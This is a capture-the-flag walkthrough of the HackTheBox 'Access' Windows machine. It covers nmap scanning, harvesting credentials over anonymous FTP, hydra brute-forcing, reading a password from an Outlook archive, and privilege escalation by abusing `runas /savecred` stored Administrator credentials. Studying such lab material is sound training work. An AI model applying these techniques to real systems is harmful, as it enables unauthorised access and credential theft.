# Hackthebox - Access - Windows

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T4 -A -p- 10.10.10.98
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 15:34 EDT
Nmap scan report for 10.10.10.98
Host is up (0.025s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|specialized
Running (JUST GUESSING): Microsoft Windows Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   28.67 ms 10.10.14.1
2   28.88 ms 10.10.10.98

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 275.90 seconds
```

## Initial foothold

### FTP

- We know with nmap that anonymous login is allowed. Let's have a look  
![image](https://user-images.githubusercontent.com/96747355/162515557-fc8e6499-c11e-4830-9100-1358fe6ae36b.png)  
- We take all the files in our attacking machine using `get`
- We have an mdb file which is a microsoft access database file, we can open it using this [website](https://www.mdbopener.com/) we also could have used `mdb-sql`
  - Theres a lot of tables however only some of them have rows
  - The one called USERINFO contains name and password, let's get the csv version of this table 
  - This definitely looks like a db for hr management
  - Another one called auth_user also has password so we take the csv as well
  - Using `awk we have a better view of our users in USERINFO even though I think the most useful file will be the other, let's still keep this aside all cleaned up with awk  
![image](https://user-images.githubusercontent.com/96747355/162520337-ed31f983-f9ad-4bf7-98df-e9d241b9671b.png)  
  - I put it in a file called userinfoclean `cat USERINFO.csv | awk -F "," '{print $25, $46, $86}' > userinfoclean`
  - For the other file `auth_user.csv` let's keep the usernames in a file called users `cat auth_user.csv | awk -F "," '{print $2}' > users` , I cleaned it a little removing the title of column and the quotes
  - And let's do the same for the pass except that we do not need admin 2 times in it so we remove also one, so it should look like this  
  ![image](https://user-images.githubusercontent.com/96747355/162522690-57cd33cb-c155-4f54-9fb4-704c14b81757.png)  

### Telnet

- We have a telnet port open
- if we use `admin` as login we get a mention that the user does not exist
- If we use `engineer` as login we then get prompt for the password (which means our user is valid), and if we type `admin` we have the handle is invalide but if we type `access4u@security` we get access denied, which means that our user pass combinaison is correct
  - Let's keep it aside `engineer` `access4u@security`

### Port 80

- We land on this page  
![image](https://user-images.githubusercontent.com/96747355/162525231-262bc255-b79d-4565-92e8-9bc81e14a132.png)  
- Let's run gobuster here (we do not get anything)

### FTP

- Let's try to bruteforce ftp with the discovered users `hydra -L users -P pass 10.10.10.98 -t 4 ftp`
- We do not get anything

### Zip file

- Let's try to unzip the password protected zip we found, as it is aes encrypted `unzip` wont work but `7z x` will work:  
![image](https://user-images.githubusercontent.com/96747355/162529730-15ae60e1-d8bd-4f41-a542-e4c7b97d5a25.png)  
- We get an Outlook email folder: 
```
┌──(root💀kali)-[~/Documents/hackthebox/access]
└─# file Access\ Control.pst 
Access Control.pst: Microsoft Outlook email folder (>=2003)
```
- We can read this file on linux using `readpst Access\ Control.pst` (`apt install readpst` to install it), here is what we get in the email, another Password!!

```
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,

John
```
- Let's add these to our files

### Telnet again

- With the new user discovered we are able to connect to the telnet port  
![image](https://user-images.githubusercontent.com/96747355/162533460-4fcc793e-48b7-4edc-a410-fa6115e69af7.png)  
- We can grab the user flag on the desktop


## Privilege escalation

```
C:\Users\security\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```
- We are going to be able to run commands as administrator (just like sudo in linux)
- Let's grab the root flag like this: `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"` and then it will be in our current user's desktop
- Have a look at [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---runas) to see how else we could use runas
